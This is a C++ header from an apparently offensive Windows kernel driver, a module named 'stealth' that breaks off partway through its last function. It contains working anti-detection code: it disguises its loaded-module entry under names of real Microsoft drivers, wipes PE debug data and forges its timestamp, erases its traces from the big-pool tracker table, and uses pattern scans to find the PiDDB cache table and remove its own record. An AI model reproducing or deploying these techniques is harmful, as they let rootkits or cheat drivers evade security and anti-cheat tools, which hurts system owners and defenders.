#pragma once

#include <ntifs.h>
#include <ntimage.h>
#include "../imports/Defs.h"
#include "../imports/Strings.h"

namespace stealth {
    inline BOOLEAN (NTAPI* _ExAcquireResourceExclusiveLite)(PVOID Resource, BOOLEAN Wait) = nullptr;
    inline BOOLEAN (NTAPI* _ExAcquireResourceSharedLite)(PVOID Resource, BOOLEAN Wait) = nullptr;
    inline VOID    (NTAPI* _ExReleaseResourceLite)(PVOID Resource) = nullptr;
    inline VOID    (NTAPI* _KeEnterCriticalRegion)() = nullptr;
    inline VOID    (NTAPI* _KeLeaveCriticalRegion)() = nullptr;
    inline PVOID   (NTAPI* _RtlLookupElementGenericTableAvl)(PVOID Table, PVOID Buffer) = nullptr;
    inline BOOLEAN (NTAPI* _RtlDeleteElementGenericTableAvl)(PVOID Table, PVOID Buffer) = nullptr;
    inline PVOID   (NTAPI* _ExAllocatePoolWithTag)(ULONG PoolType, SIZE_T NumberOfBytes, ULONG Tag) = nullptr;
    inline VOID    (NTAPI* _ExFreePoolWithTag)(PVOID P, ULONG Tag) = nullptr;
    inline PVOID   g_PsLoadedModuleResource = nullptr;

    inline volatile ULONG g_NtBuildNumber = 0;
    inline volatile LONG g_VersionResolved = 0;

    __forceinline ULONG GetNtBuildNumber() {
        LONG state = _InterlockedCompareExchange(&g_VersionResolved, 0, 0);
        if (state == 2) {
            return g_NtBuildNumber;
        }

        LONG prev = _InterlockedCompareExchange(&g_VersionResolved, 1, 0);
        if (prev == 2) return g_NtBuildNumber;
        if (prev == 1) {
            while (_InterlockedCompareExchange(&g_VersionResolved, 2, 2) != 2) {
                YieldProcessor();
            }
            return g_NtBuildNumber;
        }

        RTL_OSVERSIONINFOW version_info = { sizeof(RTL_OSVERSIONINFOW) };
        if (_RtlGetVersion && NT_SUCCESS(_RtlGetVersion(&version_info))) {
            g_NtBuildNumber = version_info.dwBuildNumber;
        } else {
            g_NtBuildNumber = 19045;
        }

        KeMemoryBarrier();
        _InterlockedExchange(&g_VersionResolved, 2);
        return g_NtBuildNumber;
    }

    __forceinline BOOLEAN IsWindows11() {
        return GetNtBuildNumber() >= 22000;
    }

    __forceinline BOOLEAN IsWindows11_24H2OrNewer() {
        return GetNtBuildNumber() >= 26100;
    }

    typedef struct _POOL_TRACKER_BIG_PAGES {
        volatile ULONGLONG Va;
        ULONG Key;
        ULONG Pattern : 8;
        ULONG PoolType : 12;
        ULONG SlushSize : 12;
        ULONGLONG NumberOfBytes;
    } POOL_TRACKER_BIG_PAGES, *PPOOL_TRACKER_BIG_PAGES;

    inline PPOOL_TRACKER_BIG_PAGES* g_PoolBigPageTable = nullptr;
    inline SIZE_T* g_PoolBigPageTableSize = nullptr;
    inline volatile LONG g_BigPoolResolved = 0;

    inline bool SetupStealthFunctions() {
        PVOID kernelBase = (PVOID)get_nt_base();
        if (!kernelBase) return false;

        *(PVOID*)&_ExAcquireResourceExclusiveLite = GetProcAddress(kernelBase, (PCHAR)skCrypt("ExAcquireResourceExclusiveLite"));
        *(PVOID*)&_ExAcquireResourceSharedLite = GetProcAddress(kernelBase, (PCHAR)skCrypt("ExAcquireResourceSharedLite"));
        *(PVOID*)&_ExReleaseResourceLite          = GetProcAddress(kernelBase, (PCHAR)skCrypt("ExReleaseResourceLite"));
        *(PVOID*)&_KeEnterCriticalRegion          = GetProcAddress(kernelBase, (PCHAR)skCrypt("KeEnterCriticalRegion"));
        *(PVOID*)&_KeLeaveCriticalRegion          = GetProcAddress(kernelBase, (PCHAR)skCrypt("KeLeaveCriticalRegion"));
        *(PVOID*)&_RtlLookupElementGenericTableAvl = GetProcAddress(kernelBase, (PCHAR)skCrypt("RtlLookupElementGenericTableAvl"));
        *(PVOID*)&_RtlDeleteElementGenericTableAvl = GetProcAddress(kernelBase, (PCHAR)skCrypt("RtlDeleteElementGenericTableAvl"));
        *(PVOID*)&_ExAllocatePoolWithTag = GetProcAddress(kernelBase, (PCHAR)skCrypt("ExAllocatePoolWithTag"));
        *(PVOID*)&_ExFreePoolWithTag = GetProcAddress(kernelBase, (PCHAR)skCrypt("ExFreePoolWithTag"));

        g_PsLoadedModuleResource = GetProcAddress(kernelBase, (PCHAR)skCrypt("PsLoadedModuleResource"));

        return (_ExAcquireResourceExclusiveLite && _ExAcquireResourceSharedLite &&
                _ExReleaseResourceLite && _KeEnterCriticalRegion && _KeLeaveCriticalRegion &&
                _RtlLookupElementGenericTableAvl && _RtlDeleteElementGenericTableAvl);
    }

    typedef struct _PIDDB_CACHE_ENTRY {
        LIST_ENTRY     List;
        UNICODE_STRING DriverName;
        ULONG          TimeDateStamp;
        NTSTATUS       LoadStatus;
        char           _pad0[16];
    } PIDDB_CACHE_ENTRY, * PPIDDB_CACHE_ENTRY;

    typedef struct _PIDDB_CACHE_ENTRY_WIN11 {
        LIST_ENTRY     List;
        UNICODE_STRING DriverName;
        ULONG          TimeDateStamp;
        NTSTATUS       LoadStatus;
        ULONG64        DriverHash;
        char           _pad0[8];
    } PIDDB_CACHE_ENTRY_WIN11, * PPIDDB_CACHE_ENTRY_WIN11;

    typedef struct _MM_UNLOADED_DRIVER {
        UNICODE_STRING Name;
        PVOID          ModuleStart;
        PVOID          ModuleEnd;
        LARGE_INTEGER  UnloadTime;
    } MM_UNLOADED_DRIVER, * PMM_UNLOADED_DRIVER;


    inline PVOID FindPattern(PVOID base, SIZE_T size, const UCHAR* pattern, const char* mask) {
        SIZE_T maskLen = 0;
        while (mask[maskLen]) maskLen++;

        if (!base || !pattern || size < maskLen)
            return nullptr;

        const UCHAR* data = static_cast<const UCHAR*>(base);
        constexpr SIZE_T pageSize = 0x1000;

        for (SIZE_T i = 0; i <= size - maskLen; ) {

            ULONG_PTR currentAddr = reinterpret_cast<ULONG_PTR>(data + i);
            ULONG_PTR currentPage = currentAddr & ~(pageSize - 1);

            if (!_MmIsAddressValid(reinterpret_cast<PVOID>(currentPage))) {

                ULONG_PTR nextPage = currentPage + pageSize;
                SIZE_T skip = nextPage - currentAddr;
                i += skip;
                continue;
            }


            ULONG_PTR pageEnd = currentPage + pageSize;
            SIZE_T maxIndexThisPage = pageEnd - reinterpret_cast<ULONG_PTR>(data);
            if (maxIndexThisPage > size) maxIndexThisPage = size;


            for (; i <= maxIndexThisPage - maskLen && i <= size - maskLen; ++i) {
                bool hit = true;
                for (SIZE_T j = 0; j < maskLen; ++j) {
                    if (mask[j] == 'x' && data[i + j] != pattern[j]) {
                        hit = false;
                        break;
                    }
                }
                if (hit)
                    return const_cast<UCHAR*>(&data[i]);
            }
        }
        return nullptr;
    }


    __forceinline PVOID ResolveRelative(PVOID insn, ULONG dispOffset, ULONG insnSize) {
        if (!insn)
            return nullptr;

        UCHAR* p = static_cast<UCHAR*>(insn);


        PVOID dispAddr = p + dispOffset;
        if (!_MmIsAddressValid(dispAddr))
            return nullptr;

        INT32 disp = *reinterpret_cast<INT32*>(dispAddr);
        return p + insnSize + disp;
    }

    inline bool GetNtTextSection(PVOID ntBase, PVOID* outBase, SIZE_T* outSize) {
        auto dos = static_cast<PIMAGE_DOS_HEADER>(ntBase);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;

        auto nt = reinterpret_cast<PIMAGE_NT_HEADERS64>((UCHAR*)ntBase + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE)  return false;

        auto sec = IMAGE_FIRST_SECTION(nt);
        for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; i++) {
            if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                *outBase = (PVOID)((UCHAR*)ntBase + sec[i].VirtualAddress);
                *outSize = sec[i].Misc.VirtualSize;
                return true;
            }
        }
        return false;
    }

    inline ULONG GetExecutableSections(PVOID moduleBase, PVOID* bases, SIZE_T* sizes, ULONG maxSections) {
        if (!moduleBase || !bases || !sizes || maxSections == 0)
            return 0;

        auto dos = static_cast<PIMAGE_DOS_HEADER>(moduleBase);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return 0;

        auto nt = reinterpret_cast<PIMAGE_NT_HEADERS64>((UCHAR*)moduleBase + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return 0;

        ULONG count = 0;
        auto sec = IMAGE_FIRST_SECTION(nt);
        for (USHORT i = 0; i < nt->FileHeader.NumberOfSections && count < maxSections; i++) {
            if ((sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) && sec[i].Misc.VirtualSize > 0) {
                bases[count] = (PVOID)((UCHAR*)moduleBase + sec[i].VirtualAddress);
                sizes[count] = sec[i].Misc.VirtualSize;
                count++;
            }
        }
        return count;
    }

    inline PVOID FindPatternSafe(PVOID base, SIZE_T size, const UCHAR* pattern, const char* mask) {
        SIZE_T maskLen = 0;
        while (mask[maskLen]) maskLen++;

        if (!base || !pattern || size < maskLen)
            return nullptr;

        const UCHAR* data = static_cast<const UCHAR*>(base);
        SIZE_T pageSize = 0x1000;

        for (SIZE_T i = 0; i <= size - maskLen; ) {
            SIZE_T currentPage = (reinterpret_cast<ULONG_PTR>(data + i)) & ~(pageSize - 1);
            if (!_MmIsAddressValid(reinterpret_cast<PVOID>(currentPage))) {
                SIZE_T nextPage = currentPage + pageSize;
                SIZE_T skip = nextPage - reinterpret_cast<ULONG_PTR>(data + i);
                i += skip;
                continue;
            }

            SIZE_T pageEnd = currentPage + pageSize - reinterpret_cast<ULONG_PTR>(data);
            if (pageEnd > size) pageEnd = size;

            if (pageEnd < maskLen) {
                i = pageEnd;
                continue;
            }

            for (; i <= pageEnd - maskLen && i <= size - maskLen; ++i) {
                bool hit = true;
                for (SIZE_T j = 0; j < maskLen; ++j) {
                    if (mask[j] == 'x' && data[i + j] != pattern[j]) {
                        hit = false;
                        break;
                    }
                }
                if (hit)
                    return const_cast<UCHAR*>(&data[i]);
            }


            if (pageEnd < size && i < pageEnd)
                i = pageEnd;
        }
        return nullptr;
    }

    inline PVOID FindPatternInAllSections(PVOID moduleBase, const UCHAR* pattern, const char* mask) {
        PVOID bases[16];
        SIZE_T sizes[16];
        ULONG count = GetExecutableSections(moduleBase, bases, sizes, 16);
        if (count == 0) return nullptr;

        for (ULONG s = 0; s < count; s++) {
            PVOID result = FindPatternSafe(bases[s], sizes[s], pattern, mask);
            if (result) return result;
        }
        return nullptr;
    }

    inline PVOID FindPatternFromInAllSections(PVOID moduleBase, SIZE_T globalStartOffset, const UCHAR* pattern, const char* mask) {
        PVOID bases[16];
        SIZE_T sizes[16];
        ULONG count = GetExecutableSections(moduleBase, bases, sizes, 16);
        if (count == 0) return nullptr;

        for (ULONG s = 0; s < count; s++) {
            ULONG_PTR secStart = reinterpret_cast<ULONG_PTR>(bases[s]);
            ULONG_PTR modBase = reinterpret_cast<ULONG_PTR>(moduleBase);
            SIZE_T secOffset = secStart - modBase;
            SIZE_T localStart = 0;
            if (globalStartOffset > secOffset)
                localStart = globalStartOffset - secOffset;
            if (localStart >= sizes[s])
                continue;
            PVOID result = FindPatternSafe((UCHAR*)bases[s] + localStart, sizes[s] - localStart, pattern, mask);
            if (result) return result;
        }
        return nullptr;
    }

    __forceinline bool SafeWriteMemory(PVOID dest, PVOID src, SIZE_T len) {
        if (!dest || len == 0 || !_MmIsAddressValid(dest))
            return false;

        if (!_IoAllocateMdl || !_IoFreeMdl || !_MmProbeAndLockPages ||
            !_MmUnlockPages || !_MmMapLockedPagesSpecifyCache || !_MmUnmapLockedPages)
            return false;

        PMDL mdl = _IoAllocateMdl(dest, (ULONG)len, FALSE, FALSE, nullptr);
        if (!mdl)
            return false;

        __try {
            _MmProbeAndLockPages(mdl, KernelMode, IoReadAccess);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            _IoFreeMdl(mdl);
            return false;
        }

        PVOID mapped = nullptr;
        __try {
            mapped = _MmMapLockedPagesSpecifyCache(
                mdl,
                KernelMode,
                MmCached,
                nullptr,
                FALSE,
                NormalPagePriority
            );
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            _MmUnlockPages(mdl);
            _IoFreeMdl(mdl);
            return false;
        }

        if (!mapped) {
            _MmUnlockPages(mdl);
            _IoFreeMdl(mdl);
            return false;
        }

        __try {
            if (src) {
                volatile UCHAR* d = static_cast<volatile UCHAR*>(mapped);
                volatile UCHAR* s = static_cast<volatile UCHAR*>(src);
                for (SIZE_T i = 0; i < len; i++)
                    d[i] = s[i];
            } else {
                volatile UCHAR* d = static_cast<volatile UCHAR*>(mapped);
                for (SIZE_T i = 0; i < len; i++)
                    d[i] = 0;
            }
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            _MmUnmapLockedPages(mapped, mdl);
            _MmUnlockPages(mdl);
            _IoFreeMdl(mdl);
            return false;
        }

        _MmUnmapLockedPages(mapped, mdl);
        _MmUnlockPages(mdl);
        _IoFreeMdl(mdl);
        return true;
    }

    __forceinline void SecureZero(PVOID dest, SIZE_T len) {
        if (!dest || len == 0)
            return;

        SafeWriteMemory(dest, nullptr, len);
    }

    __forceinline USHORT safe_wcslen(const wchar_t* s) {
        if (!s) return 0;
        USHORT len = 0;
        while (s[len] && len < 260) len++;
        return len;
    }

    inline bool DisguiseModuleEntry(PDRIVER_OBJECT DriverObject) {
        if (!DriverObject || !DriverObject->DriverSection)
            return false;

        auto entry = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);

        entry->Flags |= 0x20u;

        struct DisguiseName {
            const wchar_t* base;
            const wchar_t* full;
        };

        static const DisguiseName candidates[] = {
            { L"hwpolicy.sys",  L"\\SystemRoot\\System32\\drivers\\hwpolicy.sys"  },
            { L"mssecflt.sys",  L"\\SystemRoot\\System32\\drivers\\mssecflt.sys"  },
            { L"wmiacpi.sys",   L"\\SystemRoot\\System32\\drivers\\wmiacpi.sys"   },
            { L"mshidkmdf.sys", L"\\SystemRoot\\System32\\drivers\\mshidkmdf.sys" },
            { L"mouhid.sys",    L"\\SystemRoot\\System32\\drivers\\mouhid.sys"    },
            { L"kbdhid.sys",    L"\\SystemRoot\\System32\\drivers\\kbdhid.sys"    },
            { L"umpass.sys",    L"\\SystemRoot\\System32\\drivers\\umpass.sys"    },
            { L"swenum.sys",    L"\\SystemRoot\\System32\\drivers\\swenum.sys"    },
            { L"rdpbus.sys",    L"\\SystemRoot\\System32\\drivers\\rdpbus.sys"    },
            { L"hidparse.sys",  L"\\SystemRoot\\System32\\drivers\\hidparse.sys"  },
            { L"winhv.sys",     L"\\SystemRoot\\System32\\drivers\\winhv.sys"     },
            { L"pcw.sys",       L"\\SystemRoot\\System32\\drivers\\pcw.sys"       },
        };
        constexpr int NUM_CANDIDATES = 12;

        bool taken[NUM_CANDIDATES] = { false };

        PLIST_ENTRY start = &entry->InLoadOrderModuleList;
        PLIST_ENTRY cur = start->Flink;
        ULONG safety = 2048;

        while (cur && cur != start && safety-- > 0) {
            if (!_MmIsAddressValid(cur))
                break;

            __try {
                auto other = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);

                if (other != entry &&
                    _MmIsAddressValid(other) &&
                    other->DllBase && _MmIsAddressValid(other->DllBase) &&
                    other->BaseDllName.Buffer &&
                    other->BaseDllName.Length > 0 &&
                    other->BaseDllName.Length < 512 &&
                    _MmIsAddressValid(other->BaseDllName.Buffer)) {

                    USHORT nameChars = other->BaseDllName.Length / sizeof(wchar_t);

                    for (int i = 0; i < NUM_CANDIDATES; i++) {
                        if (!taken[i]) {
                            USHORT candChars = safe_wcslen(candidates[i].base);
                            if (nameChars == candChars) {
                                bool match = true;
                                for (USHORT j = 0; j < nameChars; j++) {
                                    if (locase_w(other->BaseDllName.Buffer[j]) != locase_w(candidates[i].base[j])) {
                                        match = false;
                                        break;
                                    }
                                }
                                if (match) taken[i] = true;
                            }
                        }
                    }
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
            }

            cur = cur->Flink;
        }

        int available_count = 0;
        int available_indices[NUM_CANDIDATES];
        for (int i = 0; i < NUM_CANDIDATES; i++) {
            if (!taken[i]) {
                available_indices[available_count++] = i;
            }
        }

        int chosen = -1;
        if (available_count > 0) {
            UINT64 entropy = __rdtsc();
            entropy ^= entropy >> 17;
            entropy *= 0x2545F4914F6CDD1DULL;
            entropy ^= entropy >> 47;
            chosen = available_indices[entropy % available_count];
        }
        if (chosen < 0) chosen = 0;

        const wchar_t* newBase = candidates[chosen].base;
        const wchar_t* newFull = candidates[chosen].full;
        USHORT newBaseChars = safe_wcslen(newBase);
        USHORT newFullChars = safe_wcslen(newFull);
        USHORT newBaseLenBytes = newBaseChars * sizeof(wchar_t);
        USHORT newFullLenBytes = newFullChars * sizeof(wchar_t);

        if (entry->BaseDllName.Buffer && _MmIsAddressValid((PVOID)entry->BaseDllName.Buffer)) {
            SafeWriteMemory(entry->BaseDllName.Buffer, nullptr, entry->BaseDllName.MaximumLength);
            if (newBaseLenBytes + sizeof(wchar_t) <= entry->BaseDllName.MaximumLength) {
                SafeWriteMemory(entry->BaseDllName.Buffer, (PVOID)newBase, newBaseLenBytes + sizeof(wchar_t));
                entry->BaseDllName.Length = newBaseLenBytes;
            }
        }

        if (entry->FullDllName.Buffer && _MmIsAddressValid((PVOID)entry->FullDllName.Buffer)) {
            SafeWriteMemory(entry->FullDllName.Buffer, nullptr, entry->FullDllName.MaximumLength);
            if (newFullLenBytes + sizeof(wchar_t) <= entry->FullDllName.MaximumLength) {
                SafeWriteMemory(entry->FullDllName.Buffer, (PVOID)newFull, newFullLenBytes + sizeof(wchar_t));
                entry->FullDllName.Length = newFullLenBytes;
            }
        }

        return true;
    }

    inline bool ScrubPEMetadata(PDRIVER_OBJECT DriverObject) {
        if (!DriverObject || !DriverObject->DriverSection)
            return false;

        auto entry = static_cast<PLDR_DATA_TABLE_ENTRY>(DriverObject->DriverSection);
        PVOID base = entry->DllBase;

        if (!base || !_MmIsAddressValid(base))
            return false;

        __try {
            auto dos = static_cast<PIMAGE_DOS_HEADER>(base);
            if (dos->e_magic != IMAGE_DOS_SIGNATURE)
                return false;

            auto nt = reinterpret_cast<PIMAGE_NT_HEADERS64>((UCHAR*)base + dos->e_lfanew);
            if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE)
                return false;

            if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress &&
                nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size) {
                ULONG dbgRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].VirtualAddress;
                ULONG dbgSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG].Size;
                PVOID debugDir = (PVOID)((UCHAR*)base + dbgRva);
                if (_MmIsAddressValid(debugDir) && dbgSize > 0 && dbgSize < 0x1000) {
                    SafeWriteMemory(debugDir, nullptr, dbgSize);
                }
                UCHAR zeroBuf[8] = { 0 };
                SafeWriteMemory(&nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG], zeroBuf, 8);
            }

            UINT64 tsc_seed = __rdtsc();
            tsc_seed ^= tsc_seed >> 17;
            tsc_seed *= 0x2545F4914F6CDD1DULL;
            static const ULONG plausible_stamps[] = {
                0x614FDB0Au, 0x619F3A68u, 0x62920B7Cu, 0x63DA8CF5u,
                0x6502F7E0u, 0x65C8A03Bu, 0x60B5F2A0u, 0x611E4080u
            };
            ULONG stamp = plausible_stamps[tsc_seed & 0x7];
            SafeWriteMemory(&nt->FileHeader.TimeDateStamp, &stamp, sizeof(stamp));
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return true;
    }

    inline bool ResolveBigPoolTable(PVOID ntBase) {
        LONG state = _InterlockedCompareExchange(&g_BigPoolResolved, 0, 0);
        if (state == 2) {
            return (g_PoolBigPageTable != nullptr);
        }

        LONG prev = _InterlockedCompareExchange(&g_BigPoolResolved, 1, 0);
        if (prev == 2) {
            return (g_PoolBigPageTable != nullptr);
        }
        if (prev == 1) {
            while (_InterlockedCompareExchange(&g_BigPoolResolved, 2, 2) != 2) {
                YieldProcessor();
            }
            return (g_PoolBigPageTable != nullptr);
        }

        PVOID secCheck[1];
        SIZE_T secCheckSz[1];
        if (!GetExecutableSections(ntBase, secCheck, secCheckSz, 1)) {
            _InterlockedExchange(&g_BigPoolResolved, 2);
            return false;
        }

        static const UCHAR patBigPool[] = {
            0x48, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x85, 0xC0
        };

        PVOID found = FindPatternInAllSections(ntBase, patBigPool, "xxx????xxx");
        if (!found) {
            static const UCHAR patBigPoolAlt[] = {
                0x4C, 0x8B, 0x25, 0x00, 0x00, 0x00, 0x00,
                0x4D, 0x85, 0xE4
            };
            found = FindPatternInAllSections(ntBase, patBigPoolAlt, "xxx????xxx");
        }

        if (found) {
            PVOID resolved = ResolveRelative(found, 3, 7);
            if (resolved && _MmIsAddressValid(resolved)) {
                g_PoolBigPageTable = (PPOOL_TRACKER_BIG_PAGES*)resolved;
            }
        }

        static const UCHAR patSize[] = {
            0x44, 0x8B, 0x35, 0x00, 0x00, 0x00, 0x00
        };

        found = FindPatternInAllSections(ntBase, patSize, "xxx????");
        if (found) {
            PVOID resolved = ResolveRelative(found, 3, 7);
            if (resolved && _MmIsAddressValid(resolved)) {
                g_PoolBigPageTableSize = (SIZE_T*)resolved;
            }
        }

        if (!g_PoolBigPageTableSize) {
            static const UCHAR patSizeAlt[] = {
                0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00
            };

            found = FindPatternInAllSections(ntBase, patSizeAlt, "xx????");
            if (found) {
                PVOID resolved = ResolveRelative(found, 2, 6);
                if (resolved && _MmIsAddressValid(resolved)) {
                    g_PoolBigPageTableSize = (SIZE_T*)resolved;
                }
            }
        }

        KeMemoryBarrier();
        _InterlockedExchange(&g_BigPoolResolved, 2);

        return (g_PoolBigPageTable != nullptr);
    }

    inline bool CleanBigPoolTable(PVOID ntBase, PVOID driverBase, SIZE_T driverSize) {
        if (!ntBase || !driverBase || driverSize == 0)
            return false;

        if (!ResolveBigPoolTable(ntBase))
            return false;

        if (!g_PoolBigPageTable || !_MmIsAddressValid(g_PoolBigPageTable))
            return false;

        PPOOL_TRACKER_BIG_PAGES table = *g_PoolBigPageTable;
        if (!table || !_MmIsAddressValid(table))
            return false;

        SIZE_T tableSize = 0;
        if (g_PoolBigPageTableSize && _MmIsAddressValid(g_PoolBigPageTableSize)) {
            tableSize = *g_PoolBigPageTableSize;
        }

        if (tableSize == 0 || tableSize > 0x100000)
            tableSize = 0x10000;

        ULONGLONG driverStart = (ULONGLONG)driverBase;
        ULONGLONG driverEnd = driverStart + driverSize;
        bool cleaned = false;

        for (SIZE_T i = 0; i < tableSize; i++) {
            __try {
                PPOOL_TRACKER_BIG_PAGES entry = &table[i];

                if (!_MmIsAddressValid(entry))
                    continue;

                volatile ULONGLONG va = entry->Va;

                if (va >= driverStart && va < driverEnd) {
                    POOL_TRACKER_BIG_PAGES zeroEntry = {};
                    zeroEntry.Va = 1;
                    SafeWriteMemory(entry, &zeroEntry, sizeof(zeroEntry));
                    cleaned = true;
                }
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                continue;
            }
        }

        return cleaned;
    }

    __forceinline bool ValidateAvlTable(PVOID pTable, PVOID textBase, SIZE_T textSize) {
        if (!pTable || !_MmIsAddressValid(pTable))
            return false;

        __try {
            ULONG64 ntTextStart = (ULONG64)textBase;
            ULONG64 ntTextEnd = ntTextStart + textSize;

            ULONG64 compAddr = *(ULONG64*)((UCHAR*)pTable + 0x48);
            if (compAddr < 0xFFFF800000000000ULL)
                return false;
            if (!_MmIsAddressValid((PVOID)compAddr))
                return false;
            if (compAddr < ntTextStart || compAddr >= ntTextEnd)
                return false;

            ULONG64 allocAddr = *(ULONG64*)((UCHAR*)pTable + 0x50);
            if (allocAddr < 0xFFFF800000000000ULL)
                return false;
            if (!_MmIsAddressValid((PVOID)allocAddr))
                return false;

            ULONG64 freeAddr = *(ULONG64*)((UCHAR*)pTable + 0x58);
            if (freeAddr < 0xFFFF800000000000ULL)
                return false;
            if (!_MmIsAddressValid((PVOID)freeAddr))
                return false;

            ULONG numElements = *(ULONG*)((UCHAR*)pTable + 0x2C);
            if (numElements == 0 || numElements > 100000)
                return false;

        } __except (EXCEPTION_EXECUTE_HANDLER) {
            return false;
        }

        return true;
    }


    inline PVOID FindPatternFrom(PVOID base, SIZE_T size, SIZE_T startOffset, const UCHAR* pattern, const char* mask) {
        SIZE_T maskLen = 0;
        while (mask[maskLen]) maskLen++;

        if (!base || !pattern || startOffset >= size || (size - startOffset) < maskLen)
            return nullptr;

        const UCHAR* data = static_cast<const UCHAR*>(base);
        constexpr SIZE_T pageSize = 0x1000;

        for (SIZE_T i = startOffset; i <= size - maskLen; ) {

            ULONG_PTR currentAddr = reinterpret_cast<ULONG_PTR>(data + i);
            ULONG_PTR currentPage = currentAddr & ~(pageSize - 1);

            if (!_MmIsAddressValid(reinterpret_cast<PVOID>(currentPage))) {

                ULONG_PTR nextPage = currentPage + pageSize;
                SIZE_T skip = nextPage - currentAddr;
                i += skip;
                continue;
            }


            ULONG_PTR pageEnd = currentPage + pageSize;
            SIZE_T maxIndexThisPage = pageEnd - reinterpret_cast<ULONG_PTR>(data);
            if (maxIndexThisPage > size) maxIndexThisPage = size;


            for (; i <= maxIndexThisPage - maskLen && i <= size - maskLen; ++i) {

                ULONG_PTR patternEndAddr = reinterpret_cast<ULONG_PTR>(data + i + maskLen - 1);
                ULONG_PTR patternEndPage = patternEndAddr & ~(pageSize - 1);
                if (patternEndPage != currentPage && !_MmIsAddressValid(reinterpret_cast<PVOID>(patternEndPage))) {

                    i = patternEndPage - reinterpret_cast<ULONG_PTR>(data);
                    break;
                }

                bool hit = true;
                for (SIZE_T j = 0; j < maskLen; ++j) {
                    if (mask[j] == 'x' && data[i + j] != pattern[j]) {
                        hit = false;
                        break;
                    }
                }
                if (hit)
                    return const_cast<UCHAR*>(&data[i]);
            }
        }
        return nullptr;
    }

    inline bool CleanPiDDBCacheTable(PVOID ntBase, PLDR_DATA_TABLE_ENTRY drvEntry) {
        if (!ntBase || !drvEntry || !drvEntry->DllBase)
            return false;

        auto dos = static_cast<PIMAGE_DOS_HEADER>(drvEntry->DllBase);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE)
            return false;

        auto ntHdr = reinterpret_cast<PIMAGE_NT_HEADERS64>((UCHAR*)drvEntry->DllBase + dos->e_lfanew);
        if (ntHdr->Signature != IMAGE_NT_SIGNATURE)
            return false;

        ULONG timeDateStamp = ntHdr->FileHeader.TimeDateStamp;

        PVOID secBases[16];
        SIZE_T secSizes[16];
        ULONG secCount = GetExecutableSections(ntBase, secBases, secSizes, 16);
        if (secCount == 0)
            return false;

        if (!_RtlLookupElementGenericTableAvl || !_RtlDeleteElementGenericTableAvl)
            return false;

        static const UCHAR patA[] = {
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0xE8, 0x00, 0x00, 0x00, 0x00,
            0x3D, 0x34, 0x00, 0x00, 0xC0
        };

        static const UCHAR patB[] = {
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0xE8, 0x00, 0x00, 0x00, 0x00,
            0x3D, 0x22, 0x00, 0x00, 0xC0
        };

        static const UCHAR patC[] = { 0x66, 0x03, 0xD2, 0x48, 0x8D, 0x0D };

        static const UCHAR patD[] = {
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0xE8, 0x00, 0x00, 0x00, 0x00,
            0x48, 0x85, 0xC0
        };

        static const UCHAR patE[] = {
            0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00,
            0x45, 0x33, 0xC0
        };

        static const UCHAR patF[] = {
            0x48, 0x8B, 0x55, 0x00, 0x48, 0x8D, 0x0D
        };

        struct PatDesc {
            const UCHAR* bytes;
            const char* mask;
            int leaOff;
        };

        PatDesc pats[] = {
            { patA, "xxx????x????xxxxx", 0 },
            { patB, "xxx????x????xxxxx", 0 },
            { patD, "xxx????x????xxx",   0 },
            { patC, "xxxxxx",            3 },
            { patE, "xxx????xxx",        0 },
            { patF, "xxx?xxx",           4 },
        };
        constexpr int NUM_PATS = 6;

        PVOID pTable = nullptr;
        PVOID leaInsn = nullptr;

        for (int p = 0; p < NUM_PATS && !pTable; p++) {
            for (ULONG sec = 0; sec < secCount && !pTable; sec++) {
                SIZE_T searchOff = 0;

                for (;;) {
                    PVOID found = FindPatternFrom(secBases[sec], secSizes[sec], searchOff, pats[p].bytes, pats[p].mask);
                    if (!found)
                        break;

                    PVOID lea = (UCHAR*)found + pats[p].leaOff;
                    PVOID candidateTable = ResolveRelative(lea, 3, 7);

                    if (candidateTable && _MmIsAddressValid(candidateTable) &&
                        ValidateAvlTable(candidateTable, secBases[sec], secSizes[sec])) {
                        pTable = candidateTable;
                        leaInsn = lea;
                        break;
                    }

                    SIZE_T consumed = ((UCHAR*)found - (UCHAR*)secBases[sec]) + 1;
                    if (consumed >= secSizes[sec])
                        break;
                    searchOff = consumed;
                }
            }
        }

        if (!pTable)
            return false;
        PVOID pLock = nullptr;

        for (int off = 0x10; off < 0xC0; off++) {
            UCHAR* scan = (UCHAR*)leaInsn - off;
            if (!_MmIsAddressValid(scan))
                break;

            __try {
                if (scan[0] == 0x48 && scan[1] == 0x8D &&
                    (scan[2] == 0x0D || scan[2] == 0x15)) {

                    PVOID cand = ResolveRelative(scan, 3, 7);
                    if (cand && _MmIsAddressValid(cand) && cand != pTable) {
                        pLock = cand;
                        break;
                    }
                }
            } __except (EXCEPTION_EXECUTE_HANDLER) {
                continue;
            }
        }

